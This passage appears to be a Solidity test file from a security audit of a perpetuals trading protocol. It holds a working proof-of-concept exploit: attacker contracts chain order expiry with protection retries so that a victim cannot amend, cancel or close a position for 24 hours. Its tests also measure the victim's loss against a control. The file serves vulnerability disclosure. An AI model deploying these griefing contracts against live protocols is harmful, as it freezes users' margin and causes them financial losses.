        uint64 protectionId
    ) external returns (uint64);

}

interface IRetryLockPublicV3Router {

    function commitOrder(
        OrderV3Types.OrderRequest calldata request
    ) external returns (uint64);

}

/// @dev Unprivileged bot: expiry and retry are separate external calls in one attacker transaction.
contract RetryLockGriefer {

    function expireAndRetry(
        address router,
        address book,
        uint64 childOrderId,
        uint64 protectionId
    ) external returns (uint64 nextChildOrderId, uint256 callGasUsed) {
        uint256 gasBefore = gasleft();
        IRetryLockExpiryRouter(router).expireOrder(childOrderId);
        nextChildOrderId = IRetryLockBook(book).retryPositionProtectionClose(protectionId);
        callGasUsed = gasBefore - gasleft();
    }

}

interface IFrozenSpreadExecutionRouter {
    function executeOrder(
        uint64 orderId,
        bytes[] calldata pythUpdateData
    ) external payable returns (OrderV3Types.ExecutionResult memory result);
}

interface IFrozenSpreadRetryBook {
    function retryPositionProtectionClose(
        uint64 protectionId
    ) external returns (uint64);
}

/// @dev Permissionless actor: terminalize a close attempt and append its allowed retry in one transaction.
contract FrozenSpreadRetryActor {
    function failAttemptAndRetry(
        address router,
        address protectionBook,
        uint64 childOrderId,
        uint64 protectionId,
        bytes[] calldata updateData
    ) external returns (OrderV3Types.ExecutionResult memory result, uint64 replacementOrderId) {
        result = IFrozenSpreadExecutionRouter(router).executeOrder(childOrderId, updateData);
        require(result.status == OrderV3Types.LifecycleStatus.Failed, "close attempt did not fail");
        replacementOrderId = IFrozenSpreadRetryBook(protectionBook).retryPositionProtectionClose(protectionId);
    }
}

/// @dev Minimal owner-authorized batching account. Its calls into the production Router and protection Book retain
///      this contract as msg.sender, as a deployed smart account or EIP-7702 delegated account would.
contract RetryLockBatchOwner {

    address public immutable owner;

    constructor(
        address owner_
    ) {
        owner = owner_;
    }

    function execute(
        address target,
        bytes calldata callData
    ) external returns (bytes memory result) {
        require(msg.sender == owner, "owner only");
        (bool ok, bytes memory returnData) = target.call(callData);
        if (!ok) {
            assembly ("memory-safe") { revert(add(returnData, 32), mload(returnData)) }
        }
        return returnData;
    }

    function executeBatch(
        address[] calldata targets,
        bytes[] calldata calls
    ) external returns (bytes[] memory results) {
        require(msg.sender == owner, "owner only");
        require(targets.length == calls.length, "length mismatch");
        results = new bytes[](calls.length);
        for (uint256 i; i < calls.length; ++i) {
            (bool ok, bytes memory returnData) = targets[i].call(calls[i]);
            if (!ok) {
                assembly ("memory-safe") { revert(add(returnData, 32), mload(returnData)) }
            }
            results[i] = returnData;
        }
    }

}

/// @notice Adversarial Position protection retry lockout proof through the public V3 Router and production protection entrypoints.
contract PositionProtectionRetryLockoutPoCTest is PositionProtectionTest {

    uint256 internal constant SL = LONG_STOP_LOSS;
    uint256 internal constant TAKE_PROFIT = 100_100_000;
    uint256 internal constant REVERSAL = 99_900_000;
    uint256 internal constant NOTIONAL_CEILING = 10_005e6;
    uint256 internal constant COLLATERAL = 20_000e6;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        // Release values from packages/perps/DEPLOYMENT.md; the inherited fixture's default 1.5% initial and
        // 1.0% maintenance margins are deliberately not used in these tests.
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _tightParams() internal pure returns (PositionProtectionTypes.PositionProtectionParams memory params) {
        params = _params(0, SL);
        params.closeLimits.maxExecutionNotionalAssets = 10_500e6;
    }

    function _boundedTpParams() internal pure returns (PositionProtectionTypes.PositionProtectionParams memory params) {
        params = _params(TAKE_PROFIT, 0);
        params.closeLimits.maxExecutionNotionalAssets = NOTIONAL_CEILING;
    }

    function _normalExecutableTpParams()
        internal
        pure
        returns (PositionProtectionTypes.PositionProtectionParams memory params)
    {
        params = _params(TAKE_PROFIT, 0);
        params.closeLimits = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: 10_020e6,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: 5e6
        });
    }

    function _unlimitedLimits() internal pure returns (PositionProtectionTypes.CloseFinancialLimits memory limits) {
        limits = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
    }

    function _openThroughPublicRouter(
        address account,
        CfdTypes.Side side,
        bytes32 clientOrderId
    ) internal returns (uint64 orderId) {
        OrderV3Types.OrderRequest memory request = _publicBoundedRequest(clientOrderId, false);
        request.side = side;
        request.sizeDelta = POSITION_SIZE;
        request.marginDelta = POSITION_MARGIN_ASSETS;
        request.targetPrice = side == CfdTypes.Side.LONG ? 1 : engine.CAP_PRICE();

        if (account.code.length == 0) {
            vm.prank(account);
            orderId = router.commitOrder(request);
        } else {
            bytes memory returned = _walletCall(
                RetryLockBatchOwner(account),
                address(router),
                abi.encodeCall(IRetryLockPublicV3Router.commitOrder, (request))
            );
            orderId = abi.decode(returned, (uint64));
        }

        vm.warp(vm.getBlockTimestamp() + 1);
        vm.roll(vm.getBlockNumber() + 1);
        bytes[] memory updateData = _mockPythUpdateData(MARK_PRICE);
        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, updateData);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "public V3 open executes");
        (uint256 size, uint256 margin,,,,,) = engine.positions(account);
        assertEq(size, POSITION_SIZE, "public Router created position");
        assertGt(margin, 1900e6, "release-margin position retains substantial margin after open charges");
        assertLt(margin, POSITION_MARGIN_ASSETS, "open charges are reflected in stored position margin");
        _refreshMark(MARK_PRICE);
    }

    function _setupLatchedEoa(
        address account,
        uint256 triggerPrice,
        PositionProtectionTypes.PositionProtectionParams memory params,
        bytes32 clientOrderId
    ) internal returns (uint64 protectionId) {
        return _setupLatchedForSide(account, CfdTypes.Side.LONG, triggerPrice, params, clientOrderId);
    }

    function _setupLatchedForSide(
        address account,
        CfdTypes.Side side,
        uint256 triggerPrice,
        PositionProtectionTypes.PositionProtectionParams memory params,
        bytes32 clientOrderId
    ) internal returns (uint64 protectionId) {
        _openThroughPublicRouter(account, side, clientOrderId);
        vm.prank(account);
        protectionId = protectionActions.createPositionProtection(params);
        uint64 childOrderId = _triggerAt(protectionId, triggerPrice);
        OrderV3Types.ExecutionResult memory result = _executeAt(childOrderId, triggerPrice);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Failed), "selected ceiling rejects close");
        assertEq(
            uint8(protectionViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Latched),
            "failed child relatches"
        );
    }

    function _executeAt(
        uint64 orderId,
        uint256 price
    ) internal returns (OrderV3Types.ExecutionResult memory result) {
        vm.warp(vm.getBlockTimestamp() + 1);
        vm.roll(vm.getBlockNumber() + 1);
        bytes[] memory updateData = _mockPythUpdateData(price);
        vm.prank(EXECUTION_KEEPER);
        result = router.executeOrder(orderId, updateData);
    }

    function _executeFrozenAt(
        uint64 orderId,
        uint256 price
    ) internal returns (OrderV3Types.ExecutionResult memory result) {
        vm.warp(vm.getBlockTimestamp() + 1);
        vm.roll(vm.getBlockNumber() + 1);
        baseMockPyth.setAllPrices(
            _basePythFeedIds(), int64(uint64(price)), 0, int32(-8), uint64(vm.getBlockTimestamp())
        );
        vm.prank(EXECUTION_KEEPER);
        result = router.executeOrder(orderId, _priceData(price));
    }

    function _walletCall(
        RetryLockBatchOwner wallet,
        address target,
        bytes memory callData
    ) internal returns (bytes memory result) {
        vm.prank(ALICE);
        result = wallet.execute(target, callData);
    }

    function _assertEoaBlocked(
        uint64 protectionId,
        uint256 nonce
    ) internal {
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        vm.prank(ALICE);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _unlimitedLimits());

        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        vm.prank(ALICE);
        protectionActions.cancelPositionProtection(protectionId);

        OrderV3Types.OrderRequest memory close = _publicBoundedRequest(bytes32(uint256(0xC0200000) + nonce), true);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
        vm.prank(ALICE);
        router.commitOrder(close);

        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        vm.prank(ALICE);
        protectionActions.cancelPositionProtectionAndCommitClose(protectionId, close);
    }

    function test_PublicRouter_BaselineOwnerAmendsAndExits() public {
        uint64 protectionId = _setupLatchedEoa(ALICE, SL, _tightParams(), bytes32("position-baseline"));
        vm.prank(ALICE);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _unlimitedLimits());

        vm.prank(CAROL);
        uint64 child = protectionActions.retryPositionProtectionClose(protectionId);
        OrderV3Types.ExecutionResult memory result = _executeAt(child, SL + 75_000);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "amended close executes");
        (uint256 size,,,,,,) = engine.positions(ALICE);
        assertEq(size, 0, "baseline owner exits");
    }

    function test_PublicRouter_EoaCanBeKeptLockedFor24HoursByActualCalls() public {
        uint64 protectionId =
            _setupLatchedForSide(ALICE, CfdTypes.Side.SHORT, TAKE_PROFIT, _boundedTpParams(), bytes32("position-duration"));
        (uint256 sizeBefore, uint256 marginBefore,,,,,) = engine.positions(ALICE);
        assertEq(sizeBefore, POSITION_SIZE, "position exists before timed lock");
        RetryLockGriefer bot = new RetryLockGriefer();

        vm.prank(CAROL);
        uint64 child = protectionActions.retryPositionProtectionClose(protectionId);
        uint256 start = vm.getBlockTimestamp();
        uint256 cycles;
        uint256 totalCycleGas;
        uint256 firstCycleGas;

        while (vm.getBlockTimestamp() < start + 24 hours) {
            uint64 deadline = router.lifecycleBook().orderTiming(child).executionDeadline;
            vm.warp(uint256(deadline) + 1);
            vm.roll(vm.getBlockNumber() + 1);

            uint256 cycleGas;
            vm.prank(CAROL);
            (child, cycleGas) = bot.expireAndRetry(address(router), address(protectionBook), child, protectionId);
            if (cycles == 0) {
                firstCycleGas = cycleGas;
            }
            totalCycleGas += cycleGas;
            assertEq(
                uint8(protectionViews.getPositionProtection(protectionId).status),
                uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered),
                "each external expiry is followed by an external retry"
            );
            if (cycles % 240 == 0) {
                _assertEoaBlocked(protectionId, cycles);
            }
            ++cycles;
        }

        _assertEoaBlocked(protectionId, cycles);
        (uint256 size, uint256 lockedMargin,,,,,) = engine.positions(ALICE);
        assertEq(size, POSITION_SIZE, "position remains open after 24 hours");
        assertEq(lockedMargin, marginBefore, "same post-open margin remains locked in the live position");
        assertGt(vm.getBlockTimestamp() - start, 24 hours, "lock lasted at least one day");
        emit log_named_uint("duration_seconds", vm.getBlockTimestamp() - start);
        emit log_named_uint("expiry_retry_cycles", cycles);
        emit log_named_uint("position_margin_locked_assets", lockedMargin);
        emit log_named_uint("first_cycle_call_gas_excluding_tx_intrinsic", firstCycleGas);
        emit log_named_uint("average_cycle_call_gas_excluding_tx_intrinsic", totalCycleGas / cycles);
    }

    function test_PublicRouter_ExpiryBoundaryAndEoaOrderingRace() public {
        uint64 protectionId = _setupLatchedEoa(ALICE, SL, _tightParams(), bytes32("position-boundary"));
        vm.prank(CAROL);
        uint64 child = protectionActions.retryPositionProtectionClose(protectionId);
        uint64 deadline = router.lifecycleBook().orderTiming(child).executionDeadline;

        vm.warp(deadline);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__OrderNotExpired.selector);
        vm.prank(CAROL);
        router.expireOrder(child);
        assertEq(
            uint8(protectionViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered),
            "deadline equality preserves child"
        );

        vm.warp(uint256(deadline) + 1);
        vm.prank(CAROL);
        router.expireOrder(child);
        assertEq(
            uint8(protectionViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Latched),
            "permissionless expiry opens the owner amendment state"
        );
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        vm.prank(ALICE);
        protectionActions.cancelPositionProtection(protectionId);

        // If the EOA uses a separate expiry transaction, a third party can retry before its next transaction.
        vm.prank(CAROL);
        uint64 replacement = protectionActions.retryPositionProtectionClose(protectionId);
        assertTrue(replacement != child, "retry appends a fresh live child");
        _assertEoaBlocked(protectionId, 0xB0);
    }

    function test_SmartWallet_AtomicExpireAmendThenCloseEscapes() public {
        RetryLockBatchOwner wallet = new RetryLockBatchOwner(ALICE);
        settlementToken.mint(address(wallet), COLLATERAL);
        _walletCall(
            wallet,
            address(settlementToken),
            abi.encodeWithSignature("approve(address,uint256)", address(clearinghouse), COLLATERAL)
        );
        _walletCall(
            wallet,
            address(clearinghouse),
            abi.encodeWithSignature("deposit(address,uint256)", address(wallet), COLLATERAL)
        );
        assertEq(clearinghouse.balanceAssets(address(wallet)), COLLATERAL, "wallet deposits its own collateral");

        _openThroughPublicRouter(address(wallet), CfdTypes.Side.LONG, bytes32("position-wallet"));
        bytes memory encodedProtection = _walletCall(
            wallet,
            address(protectionActions),
            abi.encodeCall(protectionActions.createPositionProtection, (_tightParams()))
        );
        uint64 protectionId = abi.decode(encodedProtection, (uint64));
        uint64 firstChild = _triggerAt(protectionId, SL);
        OrderV3Types.ExecutionResult memory firstFailure = _executeAt(firstChild, SL);
        assertEq(uint8(firstFailure.status), uint8(OrderV3Types.LifecycleStatus.Failed));

        vm.prank(CAROL);
        uint64 retryChild = protectionActions.retryPositionProtectionClose(protectionId);
        assertEq(
            uint8(protectionViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered)
        );

        uint64 deadline = router.lifecycleBook().orderTiming(retryChild).executionDeadline;
        vm.warp(uint256(deadline) + 1);
        vm.roll(vm.getBlockNumber() + 1);
        address[] memory targets = new address[](2);
        targets[0] = address(router);
        targets[1] = address(protectionActions);
        bytes[] memory calls = new bytes[](2);
        calls[0] = abi.encodeCall(router.expireOrder, (retryChild));
        calls[1] = abi.encodeCall(
            protectionActions.amendLatchedPositionProtectionCloseLimits, (protectionId, _unlimitedLimits())
        );
        vm.prank(ALICE);
        bytes[] memory results = wallet.executeBatch(targets, calls);
        OrderV3Types.ExecutionResult memory expired = abi.decode(results[0], (OrderV3Types.ExecutionResult));
        assertEq(uint8(expired.terminalReason), uint8(OrderV3Types.TerminalReason.Expired));
        assertEq(router.pendingOrderCounts(address(wallet)), 0, "expiry clears the pending child");
        assertEq(
            uint8(protectionViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Latched),
            "amendment executes after expiry in the same transaction"
        );

        vm.prank(CAROL);
        uint64 finalChild = protectionActions.retryPositionProtectionClose(protectionId);
        OrderV3Types.ExecutionResult memory finalResult = _executeAt(finalChild, SL + 75_000);
        assertEq(uint8(finalResult.status), uint8(OrderV3Types.LifecycleStatus.Executed), "wallet recovery closes");
        (uint256 size,,,,,,) = engine.positions(address(wallet));
        assertEq(size, 0, "wallet exits after atomic amendment");
    }

    function test_PublicRouter_MatchedShortPathMeasuresIncrementalVictimLoss() public {
        uint256 aliceStart = clearinghouse.balanceAssets(ALICE);
        uint256 bobStart = clearinghouse.balanceAssets(BOB);
        assertEq(aliceStart, bobStart, "matched starting balances");
        _openThroughPublicRouter(ALICE, CfdTypes.Side.SHORT, bytes32("position-match-alice"));
        _openThroughPublicRouter(BOB, CfdTypes.Side.SHORT, bytes32("position-match-bob"));

        PositionProtectionTypes.PositionProtectionParams memory params = _boundedTpParams();
        vm.prank(ALICE);
        uint64 aliceProtection = protectionActions.createPositionProtection(params);
        vm.prank(BOB);
        uint64 bobProtection = protectionActions.createPositionProtection(params);

        uint64 aliceFirst = _triggerAt(aliceProtection, TAKE_PROFIT);
        OrderV3Types.ExecutionResult memory aliceFailure = _executeAt(aliceFirst, TAKE_PROFIT);
        assertEq(uint8(aliceFailure.status), uint8(OrderV3Types.LifecycleStatus.Failed));
        assertEq(
            uint8(protectionViews.getPositionProtection(aliceProtection).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Latched)
        );

        uint64 bobFirst = _triggerAt(bobProtection, TAKE_PROFIT);
        OrderV3Types.ExecutionResult memory bobFailure = _executeAt(bobFirst, TAKE_PROFIT);
        assertEq(uint8(bobFailure.status), uint8(OrderV3Types.LifecycleStatus.Failed));

        vm.prank(ALICE);
        protectionActions.amendLatchedPositionProtectionCloseLimits(aliceProtection, _unlimitedLimits());
        vm.prank(CAROL);
        uint64 aliceRetry = protectionActions.retryPositionProtectionClose(aliceProtection);
        OrderV3Types.ExecutionResult memory control = _executeAt(aliceRetry, TAKE_PROFIT);
        assertEq(uint8(control.status), uint8(OrderV3Types.LifecycleStatus.Executed), "amended control takes TP");

        vm.prank(CAROL);
        uint64 bobRetry = protectionActions.retryPositionProtectionClose(bobProtection);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        vm.prank(BOB);
        protectionActions.amendLatchedPositionProtectionCloseLimits(bobProtection, _unlimitedLimits());
        OrderV3Types.ExecutionResult memory attacked = _executeAt(bobRetry, REVERSAL);
        assertEq(uint8(attacked.status), uint8(OrderV3Types.LifecycleStatus.Executed), "stale ceiling permits reversal");

        (uint256 aliceSize,,,,,,) = engine.positions(ALICE);
        (uint256 bobSize,,,,,,) = engine.positions(BOB);
        assertEq(aliceSize, 0, "control closes");
        assertEq(bobSize, 0, "attacked position eventually closes");
        uint256 aliceEnd = clearinghouse.balanceAssets(ALICE);
        uint256 bobEnd = clearinghouse.balanceAssets(BOB);
        assertEq(aliceStart, bobStart);
        assertGt(aliceEnd, bobEnd, "matched control ends with greater settlement balance");
        emit log_named_uint("control_start_balance", aliceStart);
        emit log_named_uint("control_end_balance", aliceEnd);
        emit log_named_uint("attack_start_balance", bobStart);
        emit log_named_uint("attack_end_balance", bobEnd);
        emit log_named_uint("incremental_victim_loss_vs_control", aliceEnd - bobEnd);
        emit log_named_uint("reversal_basis_points", 20);
    }

    function test_PublicRouter_FrozenSpreadMakesInitiallyExecutableFeeLimitFailAndLocksFor24Hours() public {
        _startRecordingLogs();
        _openThroughPublicRouter(ALICE, CfdTypes.Side.SHORT, bytes32("frozen-spread-alice"));
        _openThroughPublicRouter(BOB, CfdTypes.Side.SHORT, bytes32("frozen-spread-bob"));

        PositionProtectionTypes.PositionProtectionParams memory params = _normalExecutableTpParams();
        vm.prank(ALICE);
        uint64 aliceProtectionId = protectionActions.createPositionProtection(params);
        vm.prank(BOB);
        uint64 bobProtectionId = protectionActions.createPositionProtection(params);

        uint256 frozenStart = FRIDAY_FAD_START + 30 minutes;
        vm.warp(frozenStart - 70);
        vm.roll(vm.getBlockNumber() + 1);
        _refreshMark(MARK_PRICE);
        assertFalse(engine.isOracleFrozen(), "control must precede frozen market");

        uint64 bobControlChild = _triggerAt(bobProtectionId, TAKE_PROFIT);
        OrderV3Types.ExecutionResult memory controlResult = _executeAt(bobControlChild, TAKE_PROFIT);
        assertEq(uint8(controlResult.status), uint8(OrderV3Types.LifecycleStatus.Executed));
        OrderV3Types.OrderReceipt memory controlReceipt =
            _verifiedReceipt(IOrderLifecycleBook(address(router.lifecycleBook())), bobControlChild);
        assertEq(uint8(controlReceipt.executionMode), uint8(OrderV3Types.ExecutionMode.Fad));
        assertEq(controlReceipt.economics.executionNotionalAssets, 10_010e6);
        assertEq(controlReceipt.economics.frozenSpreadAssets, 0, "FAD close has no frozen spread");
        assertEq(controlReceipt.economics.executionFeeAssets, 4_004_000);
        assertLe(controlReceipt.economics.executionFeeAssets, 5e6, "same fee cap is valid before freeze");

        vm.warp(frozenStart - 61);
        vm.roll(vm.getBlockNumber() + 1);
        assertFalse(engine.isOracleFrozen(), "attacked protection triggers before freeze");
        uint64 firstAliceChild = _triggerAt(aliceProtectionId, TAKE_PROFIT);
        uint64 deadline = router.lifecycleBook().orderTiming(firstAliceChild).executionDeadline;
        assertEq(deadline, frozenStart, "child deadline is the frozen-market boundary");

        RetryLockGriefer expiryBot = new RetryLockGriefer();
        vm.warp(uint256(deadline) + 1);
        vm.roll(vm.getBlockNumber() + 1);
        assertTrue(engine.isOracleFrozen(), "expiry occurs in frozen mode");
        vm.prank(CAROL);
        (uint64 frozenChild,) = expiryBot.expireAndRetry(
            address(router), address(protectionBook), firstAliceChild, aliceProtectionId
        );

        vm.warp(vm.getBlockTimestamp() + 1);
        vm.roll(vm.getBlockNumber() + 1);
        baseMockPyth.setAllPrices(
            _basePythFeedIds(), int64(uint64(TAKE_PROFIT)), 0, int32(-8), uint64(vm.getBlockTimestamp())
        );
        _startRecordingLogs();
        FrozenSpreadRetryActor spreadBot = new FrozenSpreadRetryActor();
        bytes[] memory frozenPriceData = _priceData(TAKE_PROFIT);
        vm.prank(CAROL);
        (OrderV3Types.ExecutionResult memory frozenResult, uint64 retryChild) = spreadBot.failAttemptAndRetry(
            address(router), address(protectionBook), frozenChild, aliceProtectionId, frozenPriceData
        );
        assertEq(uint8(frozenResult.status), uint8(OrderV3Types.LifecycleStatus.Failed));
        OrderV3Types.OrderReceipt memory frozenReceipt =
            _verifiedReceipt(IOrderLifecycleBook(address(router.lifecycleBook())), frozenChild);
        assertEq(uint8(frozenReceipt.executionMode), uint8(OrderV3Types.ExecutionMode.Frozen));
        assertEq(
            uint8(frozenReceipt.failure.constraint),
            uint8(OrderV3Types.ConstraintKind.ExplicitFees),
            "frozen spread, not the notional cap, rejects the close"
        );
        assertEq(frozenReceipt.failure.limit, 5e6);
        assertEq(frozenReceipt.failure.actual, 54_054_000);
        assertEq(frozenReceipt.failure.actual - controlReceipt.economics.executionFeeAssets, 50_050_000);
        assertEq(engine.frozenCloseSpreadBps(), 50);
        assertEq(
            uint8(protectionViews.getPositionProtection(aliceProtectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered),
            "unprivileged helper retries in the same transaction after the fee-bound failure"
        );
        assertEq(router.pendingOrderCounts(ALICE), 1);
        _assertEoaBlocked(aliceProtectionId, 0xF501);
        emit log_named_uint("live_control_execution_fee_assets", controlReceipt.economics.executionFeeAssets);
        emit log_named_uint("frozen_failure_explicit_fee_assets", frozenReceipt.failure.actual);
        emit log_named_uint("frozen_failure_limit_assets", frozenReceipt.failure.limit);
        emit log_named_uint("frozen_spread_component_assets", frozenReceipt.failure.actual - controlReceipt.economics.executionFeeAssets);
        emit log_named_uint("frozen_close_spread_bps", engine.frozenCloseSpreadBps());

        uint256 lockStart = vm.getBlockTimestamp();
        uint256 cycles;
        uint256 totalCycleGas;
        uint256 firstCycleGas;
        while (vm.getBlockTimestamp() < lockStart + 24 hours) {
            uint64 childDeadline = router.lifecycleBook().orderTiming(retryChild).executionDeadline;
            vm.warp(uint256(childDeadline) + 1);
            vm.roll(vm.getBlockNumber() + 1);
            uint256 cycleGas;
            vm.prank(CAROL);
            (retryChild, cycleGas) = expiryBot.expireAndRetry(
                address(router), address(protectionBook), retryChild, aliceProtectionId
            );
            if (cycles == 0) firstCycleGas = cycleGas;
            totalCycleGas += cycleGas;
            assertTrue(engine.isOracleFrozen(), "lock remains inside frozen market window");
            assertEq(
                uint8(protectionViews.getPositionProtection(aliceProtectionId).status),
                uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered)
            );
            if (cycles % 240 == 0) _assertEoaBlocked(aliceProtectionId, cycles);
            ++cycles;
        }

        _assertEoaBlocked(aliceProtectionId, cycles);
        (uint256 size, uint256 finalMargin,,,,,) = engine.positions(ALICE);
        assertEq(size, POSITION_SIZE, "position remains open after 24 frozen hours");
        assertGt(finalMargin, 1_900e6, "position margin remains pledged");
        assertGt(vm.getBlockTimestamp() - lockStart, 24 hours);
        emit log_named_uint("frozen_lock_duration_seconds", vm.getBlockTimestamp() - lockStart);
        emit log_named_uint("frozen_expiry_retry_cycles", cycles);
        emit log_named_uint("frozen_position_margin_locked_assets", finalMargin);
        emit log_named_uint("frozen_first_cycle_call_gas", firstCycleGas);
        emit log_named_uint("frozen_average_cycle_call_gas", totalCycleGas / cycles);
    }

    function test_LockedPositionMarginCannotBeWithdrawnUntilOwnerRecovers() public {
        uint64 protectionId = _setupLatchedForSide(
            ALICE, CfdTypes.Side.SHORT, TAKE_PROFIT, _boundedTpParams(), bytes32("position-withdraw")
        );
        (uint256 positionSize, uint256 positionMargin,,,,,) = engine.positions(ALICE);
        assertEq(positionSize, POSITION_SIZE, "position remains open while latched");
        assertGt(positionMargin, 1_900e6, "position margin is present");

        uint256 freeAssets = clearinghouse.getAccountAssetBuckets(ALICE).freeSettlementAssets;
        assertGt(freeAssets, 0, "control has withdrawable free settlement before recovery");
        uint256 walletBefore = settlementToken.balanceOf(ALICE);
        vm.prank(ALICE);
        clearinghouse.withdraw(ALICE, freeAssets);
        assertEq(
            settlementToken.balanceOf(ALICE), walletBefore + freeAssets, "free settlement remains withdrawable"
        );
        assertEq(clearinghouse.getAccountAssetBuckets(ALICE).freeSettlementAssets, 0);

        uint256 walletBeforeLockedAttempt = settlementToken.balanceOf(ALICE);
        vm.expectRevert();
        vm.prank(ALICE);
        clearinghouse.withdraw(ALICE, positionMargin);
        assertEq(
            settlementToken.balanceOf(ALICE),
            walletBeforeLockedAttempt,
            "withdrawal cannot transfer the pledged position margin"
        );
        (uint256 sizeStillOpen, uint256 marginStillLocked,,,,,) = engine.positions(ALICE);
        assertEq(sizeStillOpen, POSITION_SIZE);
        assertEq(marginStillLocked, positionMargin);

        vm.prank(ALICE);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _unlimitedLimits());
        vm.prank(CAROL);
        uint64 closeOrder = protectionActions.retryPositionProtectionClose(protectionId);
        OrderV3Types.ExecutionResult memory result = _executeAt(closeOrder, TAKE_PROFIT);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "owner recovery closes position");
        (sizeStillOpen,,,,,,) = engine.positions(ALICE);
        assertEq(sizeStillOpen, 0);

        uint256 freeAfterRecovery = clearinghouse.getAccountAssetBuckets(ALICE).freeSettlementAssets;
        assertGt(freeAfterRecovery, 0, "close releases margin into free settlement");
        uint256 walletAfterClose = settlementToken.balanceOf(ALICE);
        vm.prank(ALICE);
        clearinghouse.withdraw(ALICE, freeAfterRecovery);
        assertEq(
            settlementToken.balanceOf(ALICE),
            walletAfterClose + freeAfterRecovery,
            "withdrawal succeeds after normal owner recovery"
        );
    }

}
```
